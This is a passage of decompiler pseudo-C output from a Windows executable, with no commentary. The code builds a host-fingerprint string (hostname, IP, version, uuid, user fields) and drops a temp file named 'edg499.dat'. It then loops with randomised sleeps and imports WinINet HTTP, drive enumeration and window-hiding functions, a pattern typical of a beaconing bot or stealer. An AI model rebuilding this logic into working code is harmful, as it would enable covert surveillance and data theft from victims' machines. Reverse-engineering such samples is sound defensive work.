        // 0x40b1a8
        v169 = v171 + 1;
        v170 = (char *)v169;
        v171 = v169;
    }
    uint32_t v172 = v168 - v166; // 0x40b1a3
    uint32_t v173 = v172 / 4; // 0x40b1b2
    __asm_rep_movsd_memcpy(v170, (char *)v166, v173);
    char * v174 = (char *)(v169 + v173 * v155); // 0x40b1c3
    __asm_rep_movsb_memcpy(v174, v174, v172 & 3);
    *v164 = 35;
    *v140 = 0x3d6e63;
    int32_t v175 = v142;
    int32_t v176 = v175 + 1; // 0x40b1e2
    while (*(char *)v175 != 0) {
        // 0x40b1e0
        v175 = v176;
        v176 = v175 + 1;
    }
    int32_t v177 = v149 + 1; // 0x40b1f3
    char * v178 = (char *)v177;
    int32_t v179 = v177; // 0x40b1f9
    while (*v178 != 0) {
        // 0x40b1f3
        v177 = v179 + 1;
        v178 = (char *)v177;
        v179 = v177;
    }
    uint32_t v180 = v176 - v142; // 0x40b1ee
    uint32_t v181 = v180 / 4; // 0x40b1fd
    __asm_rep_movsd_memcpy(v178, v164, v181);
    char * v182 = (char *)(v177 + v181 * v155); // 0x40b207
    __asm_rep_movsb_memcpy(v182, v182, v180 & 3);
    int32_t v183 = function_405980(); // 0x40b209
    int32_t v184 = v183;
    int32_t v185 = v184 + 1; // 0x40b212
    while (*(char *)v184 != 0) {
        // 0x40b210
        v184 = v185;
        v185 = v184 + 1;
    }
    int32_t v186 = v149 + 1; // 0x40b223
    char * v187 = (char *)v186;
    int32_t v188 = v186; // 0x40b229
    while (*v187 != 0) {
        // 0x40b223
        v186 = v188 + 1;
        v187 = (char *)v186;
        v188 = v186;
    }
    uint32_t v189 = v185 - v183; // 0x40b21e
    uint32_t v190 = v189 / 4; // 0x40b22d
    __asm_rep_movsd_memcpy(v187, (char *)v183, v190);
    char * v191 = (char *)(v186 + v190 * v155); // 0x40b23e
    __asm_rep_movsb_memcpy(v191, v191, v189 & 3);
    *v164 = 35;
    *v140 = 0x3d6e6f;
    int32_t v192 = v142;
    int32_t v193 = v192 + 1; // 0x40b256
    while (*(char *)v192 != 0) {
        // 0x40b254
        v192 = v193;
        v193 = v192 + 1;
    }
    int32_t v194 = v149 + 1; // 0x40b267
    char * v195 = (char *)v194;
    int32_t v196 = v194; // 0x40b26d
    while (*v195 != 0) {
        // 0x40b267
        v194 = v196 + 1;
        v195 = (char *)v194;
        v196 = v194;
    }
    uint32_t v197 = v193 - v142; // 0x40b262
    uint32_t v198 = v197 / 4; // 0x40b271
    __asm_rep_movsd_memcpy(v195, v164, v198);
    char * v199 = (char *)(v194 + v198 * v155); // 0x40b27b
    __asm_rep_movsb_memcpy(v199, v199, v197 & 3);
    int32_t v200 = function_405db0(); // 0x40b27d
    int32_t v201 = v200;
    int32_t v202 = v201 + 1; // 0x40b286
    while (*(char *)v201 != 0) {
        // 0x40b284
        v201 = v202;
        v202 = v201 + 1;
    }
    int32_t v203 = v149 + 1; // 0x40b295
    char * v204 = (char *)v203;
    int32_t v205 = v203; // 0x40b29b
    while (*v204 != 0) {
        // 0x40b295
        v203 = v205 + 1;
        v204 = (char *)v203;
        v205 = v203;
    }
    uint32_t v206 = v202 - v200; // 0x40b292
    uint32_t v207 = v206 / 4; // 0x40b29f
    __asm_rep_movsd_memcpy(v204, (char *)v200, v207);
    char * v208 = (char *)(v203 + v207 * v155); // 0x40b2b0
    __asm_rep_movsb_memcpy(v208, v208, v206 & 3);
    *v164 = 35;
    *v140 = 0x3d6e616c;
    *(char *)v141 = 0;
    int32_t v209 = v142;
    int32_t v210 = v209 + 1; // 0x40b2d2
    while (*(char *)v209 != 0) {
        // 0x40b2d0
        v209 = v210;
        v210 = v209 + 1;
    }
    int32_t v211 = v149 + 1; // 0x40b2e3
    char * v212 = (char *)v211;
    int32_t v213 = v211; // 0x40b2e9
    while (*v212 != 0) {
        // 0x40b2e3
        v211 = v213 + 1;
        v212 = (char *)v211;
        v213 = v211;
    }
    uint32_t v214 = v210 - v142; // 0x40b2de
    uint32_t v215 = v214 / 4; // 0x40b2ed
    __asm_rep_movsd_memcpy(v212, v164, v215);
    char * v216 = (char *)(v211 + v215 * v155); // 0x40b2f7
    __asm_rep_movsb_memcpy(v216, v216, v214 & 3);
    *v134 = 80;
    *v136 = v130 + 792;
    int32_t v217 = gethostname((char *)&g14, (int32_t)&g14); // 0x40b303
    int32_t v218 = (int32_t)"not available"; // 0x40b30c
    int32_t v219 = v135; // 0x40b30c
    if (v217 != -1) {
        // 0x40b315
        *v138 = v130 + 784;
        struct hostent * v220 = gethostbyname((char *)&g14); // 0x40b31d
        v218 = (int32_t)"not available";
        v219 = v137;
        if (v220 != NULL) {
            int32_t v221 = *(int32_t *)*(int32_t *)((int32_t)v220 + 12); // 0x40b331
            if (v221 == 0) {
                // 0x40b343
                v218 = *(int32_t *)(v130 + 8);
                v219 = v137;
            } else {
                int32_t v222 = v130 - 16; // 0x40b33a
                *(int32_t *)v222 = *(int32_t *)v221;
                v218 = (int32_t)inet_ntoa((struct {int32_t e0;}){
                    .e0 = (int32_t)&g14
                });
                v219 = v222;
            }
        }
    }
    int32_t v223 = v219;
    int32_t v224 = v218; // 0x40b349
    while (*(char *)v224 != 0) {
        // 0x40b350
        v224++;
    }
    int32_t v225 = v223 + 1031; // 0x40b360
    int32_t v226 = v225; // 0x40b360
    v226++;
    char * v227 = (char *)v226;
    while (*v227 != 0) {
        // 0x40b361
        v226++;
        v227 = (char *)v226;
    }
    uint32_t v228 = v224 - v218; // 0x40b35e
    uint32_t v229 = v228 / 4; // 0x40b36b
    __asm_rep_movsd_memcpy(v227, (char *)v218, v229);
    int32_t v230 = v223 + 728; // 0x40b375
    char * v231 = (char *)(v226 + v229 * v155); // 0x40b37c
    __asm_rep_movsb_memcpy(v231, v231, v228 & 3);
    char * v232 = (char *)v230; // 0x40b37e
    *v232 = 35;
    int32_t * v233 = (int32_t *)(v223 + 729); // 0x40b385
    *v233 = 0x3d706f6e;
    int32_t v234 = v223 + 733; // 0x40b390
    *(char *)v234 = 0;
    int32_t v235 = v230;
    int32_t v236 = v235 + 1; // 0x40b3a2
    while (*(char *)v235 != 0) {
        // 0x40b3a0
        v235 = v236;
        v236 = v235 + 1;
    }
    int32_t v237 = v225 + 1; // 0x40b3b3
    char * v238 = (char *)v237;
    int32_t v239 = v237; // 0x40b3b9
    while (*v238 != 0) {
        // 0x40b3b3
        v237 = v239 + 1;
        v238 = (char *)v237;
        v239 = v237;
    }
    uint32_t v240 = v236 - v230; // 0x40b3ae
    uint32_t v241 = v240 / 4; // 0x40b3bd
    __asm_rep_movsd_memcpy(v238, v232, v241);
    char * v242 = (char *)(v237 + v241 * v155); // 0x40b3c7
    __asm_rep_movsb_memcpy(v242, v242, v240 & 3);
    *v232 = 35;
    *v233 = 0x3d726576;
    *(int32_t *)v234 = 0x302e31;
    int32_t v243 = v230;
    int32_t v244 = v243 + 1; // 0x40b3f2
    while (*(char *)v243 != 0) {
        // 0x40b3f0
        v243 = v244;
        v244 = v243 + 1;
    }
    int32_t v245 = v225 + 1; // 0x40b403
    char * v246 = (char *)v245;
    int32_t v247 = v245; // 0x40b409
    while (*v246 != 0) {
        // 0x40b403
        v245 = v247 + 1;
        v246 = (char *)v245;
        v247 = v245;
    }
    uint32_t v248 = v244 - v230; // 0x40b3fe
    uint32_t v249 = v248 / 4; // 0x40b414
    __asm_rep_movsd_memcpy(v246, v232, v249);
    char * v250 = (char *)(v245 + v249 * v155); // 0x40b41e
    __asm_rep_movsb_memcpy(v250, v250, v248 & 3);
    int32_t v251 = v223 + 928; // 0x40b426
    *(int32_t *)v251 = 0x64697575;
    *(int16_t *)(v223 + 932) = 61;
    int32_t v252 = function_4056c0(); // 0x40b435
    int32_t v253 = v252; // 0x40b43c
    while (*(char *)v253 != 0) {
        // 0x40b440
        v253++;
    }
    int32_t v254 = v223 + 927; // 0x40b452
    int32_t v255 = v254; // 0x40b452
    v255++;
    char * v256 = (char *)v255;
    while (*v256 != 0) {
        // 0x40b453
        v255++;
        v256 = (char *)v255;
    }
    uint32_t v257 = v253 - v252; // 0x40b44e
    uint32_t v258 = v257 / 4; // 0x40b45d
    __asm_rep_movsd_memcpy(v256, (char *)v252, v258);
    char * v259 = (char *)(v255 + v258 * v155); // 0x40b46e
    __asm_rep_movsb_memcpy(v259, v259, v257 & 3);
    int32_t v260 = v254;
    int32_t v261 = v260 + 1; // 0x40b471
    while (*(char *)v261 != 0) {
        // 0x40b471
        v260 = v261;
        v261 = v260 + 1;
    }
    // 0x40b479
    *(int32_t *)v261 = 0x3d6e7523;
    *(char *)(v260 + 5) = 0;
    int32_t v262 = function_405a60(); // 0x40b48a
    int32_t v263 = v262;
    int32_t v264 = v263 + 1; // 0x40b493
    while (*(char *)v263 != 0) {
        // 0x40b491
        v263 = v264;
        v264 = v263 + 1;
    }
    int32_t v265 = v254 + 1; // 0x40b4a2
    char * v266 = (char *)v265;
    int32_t v267 = v265; // 0x40b4a8
    while (*v266 != 0) {
        // 0x40b4a2
        v265 = v267 + 1;
        v266 = (char *)v265;
        v267 = v265;
    }
    uint32_t v268 = v264 - v262; // 0x40b49f
    uint32_t v269 = v268 / 4; // 0x40b4b2
    __asm_rep_movsd_memcpy(v266, (char *)v262, v269);
    *(int32_t *)(v223 - 4) = (int32_t)&g12;
    *(int32_t *)(v223 - 8) = 0;
    *(int32_t *)(v223 - 12) = 0;
    char * v270 = (char *)(v265 + v269 * v155); // 0x40b4c5
    __asm_rep_movsb_memcpy(v270, v270, v268 & 3);
    *(int32_t *)(v223 - 16) = 0x404f90;
    int32_t v271 = v223 + 1528; // 0x40b4d3
    *(int32_t *)(v223 + 24) = v223 + 1032;
    *(int32_t *)(v223 - 20) = 0;
    *(int32_t *)(v223 - 24) = 0;
    *(int32_t *)(v223 + 28) = v271;
    *(int32_t *)(v223 + 32) = v251;
    *(int32_t *)(v223 + 36) = v271;
    CreateThread((struct _SECURITY_ATTRIBUTES *)&g14, (int32_t)&g14, (int32_t (*)(int32_t *))&g14, &g14, (int32_t)&g14, &g14);
    int32_t * v272 = (int32_t *)(v223 - 28); // 0x40b4f9
    *v272 = 259;
    int32_t * v273 = (int32_t *)(v223 - 32); // 0x40b505
    *v273 = 0;
    int32_t * v274 = (int32_t *)(v223 - 36); // 0x40b507
    *v274 = v223 + 1241;
    int32_t v275 = v223 + 1240; // 0x40b508
    *(char *)v275 = 0;
    _memset(&g14, (int32_t)&g14, (int32_t)&g14);
    *v272 = v275;
    *v273 = 260;
    GetTempPathA((int32_t)&g14, (char *)&g14);
    *v274 = (int32_t)"edg499.dat";
    *(int32_t *)(v223 - 40) = v223 + 1232;
    lstrcatA((char *)&g14, (char *)&g14);
    *(int32_t *)(v223 - 44) = 0;
    int32_t v276 = v223 - 48; // 0x40b540
    *(int32_t *)v276 = 128;
    int32_t v277 = v223 - 52; // 0x40b545
    *(int32_t *)v277 = 2;
    *(int32_t *)(v223 - 56) = 0;
    *(int32_t *)(v223 - 60) = 0;
    *(int32_t *)(v223 - 64) = 0x40000000;
    *(int32_t *)(v223 - 68) = v223 + 1224;
    int32_t * fileHandle = CreateFileA((char *)&g14, (int32_t)&g14, (int32_t)&g14, (struct _SECURITY_ATTRIBUTES *)&g14, (int32_t)&g14, (int32_t)&g14, &g14); // 0x40b558
    g10 = (int32_t)fileHandle;
    function_4090f0();
    *(int32_t *)(v223 - 72) = g10;
    CloseHandle(&g14);
    *(int32_t *)(v223 - 76) = v277;
    *(int32_t *)(v223 - 80) = 0;
    *(int32_t *)(v223 - 84) = v276;
    *(int32_t *)(v223 - 88) = 0x409170;
    *(int32_t *)(v223 - 92) = 0;
    int32_t v278 = v223 - 96; // 0x40b588
    *(int32_t *)v278 = 0;
    int32_t * threadHandle = CreateThread((struct _SECURITY_ATTRIBUTES *)&g14, (int32_t)&g14, (int32_t (*)(int32_t *))&g14, &g14, (int32_t)&g14, &g14); // 0x40b589
    int32_t v279 = v278; // 0x40b58d
    int32_t v280 = (int32_t)threadHandle; // 0x40b58d
    int32_t v281 = 0; // 0x40b58d
    int32_t v282; // 0x40aa50
    int32_t v283; // 0x40aa50
    int32_t v284; // 0x40b5b4
    int32_t * threadHandle3; // 0x40b5b6
    while (true) {
      lab_0x40b590:;
        int32_t v285 = v281;
        int32_t v286 = v280;
        int32_t v287 = v279;
        *(int32_t *)(v287 - 4) = 0;
        int32_t v288 = v287 - 8; // 0x40b592
        *(int32_t *)v288 = v286;
        int32_t v289 = WaitForSingleObject(&g14, (int32_t)&g14); // 0x40b593
        if (v285 > 9) {
            // 0x40b5bb
            *(int32_t *)(v287 - 12) = v287 + 12;
            *(int32_t *)(v287 - 16) = 0;
            *(int32_t *)(v287 - 20) = v287 + 16;
            *(int32_t *)(v287 - 24) = 0x409170;
            *(int32_t *)(v287 - 28) = 0;
            int32_t v290 = v287 - 32; // 0x40b5ce
            *(int32_t *)v290 = 0;
            int32_t * threadHandle2 = CreateThread((struct _SECURITY_ATTRIBUTES *)&g14, (int32_t)&g14, (int32_t (*)(int32_t *))&g14, &g14, (int32_t)&g14, &g14); // 0x40b5d0
            threadHandle3 = threadHandle2;
            v284 = v290;
            v283 = 0;
            goto lab_0x40b5d4;
        } else {
            // 0x40b59e
            v282 = v288;
            v280 = v286;
            v281 = v285;
            if (v289 != 0) {
                goto lab_0x40b5d6;
            } else {
                // 0x40b5a2
                *(int32_t *)(v287 - 12) = v287 + 12;
                *(int32_t *)(v287 - 16) = v289;
                *(int32_t *)(v287 - 20) = v287 + 24;
                *(int32_t *)(v287 - 24) = 0x409170;
                *(int32_t *)(v287 - 28) = 0;
                v284 = v287 - 32;
                *(int32_t *)v284 = 0;
                threadHandle3 = CreateThread((struct _SECURITY_ATTRIBUTES *)&g14, (int32_t)&g14, (int32_t (*)(int32_t *))&g14, &g14, (int32_t)&g14, &g14);
                v283 = v285 + 1;
                goto lab_0x40b5d4;
            }
        }
    }
  lab_0x40b5d4:
    // 0x40b5d4
    v282 = v284;
    v280 = (int32_t)threadHandle3;
    v281 = v283;
    goto lab_0x40b5d6;
  lab_0x40b5d6:
    // 0x40b5d6
    v279 = v282 - 4;
    int32_t * v291 = (int32_t *)v279; // 0x40b5d6
    *v291 = 0;
    *v291 = __time64();
    _srand((int32_t)&g14);
    _rand();
    int32_t v292 = _rand(); // 0x40b5ee
    *v291 = (int32_t)((0x100000000 * (int64_t)(v292 >> 31) | (int64_t)v292) % 0x4e20) + 0x2710;
    Sleep((int32_t)&g14);
    goto lab_0x40b590;
}

// Address range: 0x40b60a - 0x40b619
int32_t _40___security_check_cookie_40_4(void) {
    // 0x40b60a
    int32_t v1; // 0x40b60a
    if (v1 != g4) {
        // 0x40b614
        return ___report_gsfailure();
    }
    // 0x40b612
    int32_t result; // 0x40b60a
    return result;
}

// Address range: 0x40b7bd - 0x40b7ca
// From class:    .?AVbad_alloc@std@@
// Type:          virtual member function
int32_t function_40b7bd(void) {
    // 0x40b7bd
    int32_t v1; // 0x40b7bd
    int32_t v2 = *(int32_t *)(v1 + 4); // 0x40b7bd
    return v2 != 0 ? v2 : (int32_t)"Unknown exception";
}

// Address range: 0x40bc21 - 0x40bc2c
int32_t function_40bc21(void) {
    // 0x40bc21
    return _3f__3f_2_40_YAPAXI_40_Z((int32_t)&g14);
}

// Address range: 0x40cb7c - 0x40cb87
int32_t function_40cb7c(void) {
    // 0x40cb7c
    int32_t result; // 0x40cb7c
    return result;
}

// --------------- Statically Linked Functions ----------------

// int32_t _3f__3f_2_40_YAPAXI_40_Z(int32_t a1);
// int32_t _3f__3f__G__non_rtti_object_40_std_40__40_UAEPAXI_40_Z(int32_t a1);
// int32_t _3f__3f__Gtype_info_40__40_UAEPAXI_40_Z(int32_t a1);
// int32_t _3f__Tidy_40_exception_40_std_40__40_AAEXXZ(void);
// int32_t ___report_gsfailure(void);
// int32_t __chkstk(void);
// char * __cdecl itoa(_In_ int Value, char * Buffer, _In_ int Radix);
// int32_t __time64(void);
// void * malloc(size_t size);
// size_t mbstowcs(wchar_t * restrict pwcs, const char * restrict s, size_t n);
// void * memcpy(void * restrict dest, const void * restrict src, size_t n);
// void * memset(void * s, int c, size_t n);
// int printf(const char * restrict format, ...);
// int rand(void);
// void srand(unsigned int seed);
// char * strncpy(char * restrict dest, const char * restrict src, size_t n);

// --------------- Dynamically Linked Functions ---------------

// BOOL CloseHandle(_In_ HANDLE hObject);
// HANDLE CreateFileA(_In_ LPCSTR lpFileName, _In_ DWORD dwDesiredAccess, _In_ DWORD dwShareMode, _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes, _In_ DWORD dwCreationDisposition, _In_ DWORD dwFlagsAndAttributes, _In_opt_ HANDLE hTemplateFile);
// HANDLE CreateThread(_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes, _In_ SIZE_T dwStackSize, _In_ LPTHREAD_START_ROUTINE lpStartAddress, _In_opt_ LPVOID lpParameter, _In_ DWORD dwCreationFlags, _Out_opt_ LPDWORD lpThreadId);
// VOID ExitProcess(_In_ UINT uExitCode);
// BOOL FindClose(_Inout_ HANDLE hFindFile);
// HANDLE FindFirstFileW(_In_ LPCWSTR lpFileName, _Out_ LPWIN32_FIND_DATAW lpFindFileData);
// BOOL FindNextFileW(_In_ HANDLE hFindFile, _Out_ LPWIN32_FIND_DATAW lpFindFileData);
// void * GdipAlloc(size_t size);
// GpStatus GdipCloneImage(GpImage * image, GpImage ** cloneImage);
// GpStatus GdipDisposeImage(GpImage * image);
// void GdipFree(void * ptr);
// HWND GetConsoleWindow(VOID);
// DWORD GetCurrentProcessId(VOID);
// UINT GetDriveTypeW(_In_opt_ LPCWSTR lpRootPathName);
// struct hostent * gethostbyname(_In_z_ const char * name);
// int gethostname(char * name, _In_ int namelen);
// DWORD GetLastError(VOID);
// DWORD GetLogicalDriveStringsW(_In_ DWORD nBufferLength, LPWSTR lpBuffer);
// HMODULE GetModuleHandleA(_In_opt_ LPCSTR lpModuleName);
// HMODULE GetModuleHandleW(_In_opt_ LPCWSTR lpModuleName);
// FARPROC GetProcAddress(_In_ HMODULE hModule, _In_ LPCSTR lpProcName);
// DWORD GetTempPathA(_In_ DWORD nBufferLength, LPSTR lpBuffer);
// DWORD GetTickCount(VOID);
// NOT_BUILD_WINDOWS_DEPRECATE BOOL GetVersionExW(_Inout_ LPOSVERSIONINFOW lpVersionInformation);
// int32_t HttpOpenRequestA(void);
// BOOL HttpSendRequestA(_In_ HINTERNET hRequest, LPCSTR lpszHeaders, _In_ DWORD dwHeadersLength, LPVOID lpOptional, _In_ DWORD dwOptionalLength);
// char * inet_ntoa(_In_ struct in_addr in);
// BOOL InternetCheckConnectionA(_In_ LPCSTR lpszUrl, _In_ DWORD dwFlags, _In_ DWORD dwReserved);
// BOOL InternetCloseHandle(_In_ HINTERNET hInternet);
// HINTERNET InternetConnectA(_In_ HINTERNET hInternet, _In_ LPCSTR lpszServerName, _In_ INTERNET_PORT nServerPort, _In_ LPCSTR lpszUsername, _In_ LPCSTR lpszPassword, _In_ DWORD dwService, _In_ DWORD dwFlags, _In_ DWORD_PTR dwContext);
// BOOL InternetGetConnectedState(_Out_ LPDWORD lpdwFlags, DWORD dwReserved);
// HINTERNET InternetOpenA(_In_ LPCSTR lpszAgent, _In_ DWORD dwAccessType, _In_ LPCSTR lpszProxyName, _In_ LPCSTR lpszProxyBypass, _In_ DWORD dwFlags);
// HINTERNET InternetOpenUrlW(_In_ HINTERNET hInternet, _In_ LPCWSTR lpszUrl, _In_ LPCWSTR lpszHeaders, _In_ DWORD dwHeadersLength, _In_ DWORD dwFlags, _In_ DWORD_PTR dwContext);
// HINTERNET InternetOpenW(_In_ LPCWSTR lpszAgent, _In_ DWORD dwAccessType, _In_ LPCWSTR lpszProxyName, _In_ LPCWSTR lpszProxyBypass, _In_ DWORD dwFlags);
// BOOL InternetReadFile(_In_ HINTERNET hFile, LPVOID lpBuffer, _In_ DWORD dwNumberOfBytesToRead, _Out_ LPDWORD lpdwNumberOfBytesRead);
// HMODULE LoadLibraryW(_In_ LPCWSTR lpLibFileName);
// HLOCAL LocalAlloc(_In_ UINT uFlags, _In_ SIZE_T uBytes);
// HLOCAL LocalFree(HLOCAL hMem);
// LPSTR lstrcatA(LPSTR lpString1, _In_ LPCSTR lpString2);
// int lstrcmpA(_In_ LPCSTR lpString1, _In_ LPCSTR lpString2);
// int lstrcmpW(_In_ LPCWSTR lpString1, _In_ LPCWSTR lpString2);
// LPSTR lstrcpyA(LPSTR lpString1, _In_ LPCSTR lpString2);
// int lstrlenA(_In_ LPCSTR lpString);
// int lstrlenW(_In_ LPCWSTR lpString);
// HANDLE OpenProcess(_In_ DWORD dwDesiredAccess, _In_ BOOL bInheritHandle, _In_ DWORD dwProcessId);
// BOOL ReadFile(_In_ HANDLE hFile, LPVOID lpBuffer, _In_ DWORD nNumberOfBytesToRead, _Out_opt_ LPDWORD lpNumberOfBytesRead, _Inout_opt_ LPOVERLAPPED lpOverlapped);
// BOOL ReleaseMutex(_In_ HANDLE hMutex);
// BOOL ShowWindow(_In_ HWND hWnd, _In_ int nCmdShow);
// VOID Sleep(_In_ DWORD dwMilliseconds);
// PCSTR StrStrIA(_In_ PCSTR pszFirst, _In_ PCSTR pszSrch);
// DWORD WaitForSingleObject(_In_ HANDLE hHandle, _In_ DWORD dwMilliseconds);
// BOOL WriteFile(_In_ HANDLE hFile, LPCVOID lpBuffer, _In_ DWORD nNumberOfBytesToWrite, _Out_opt_ LPDWORD lpNumberOfBytesWritten, _Inout_opt_ LPOVERLAPPED lpOverlapped);
// int wsprintfW(_Out_ LPWSTR, _In_ LPCWSTR, ...);

// --------------------- Meta-Information ---------------------

// Detected compiler/packer: microsoft linker (10.0)
// Detected language: C++
// Detected functions: 27
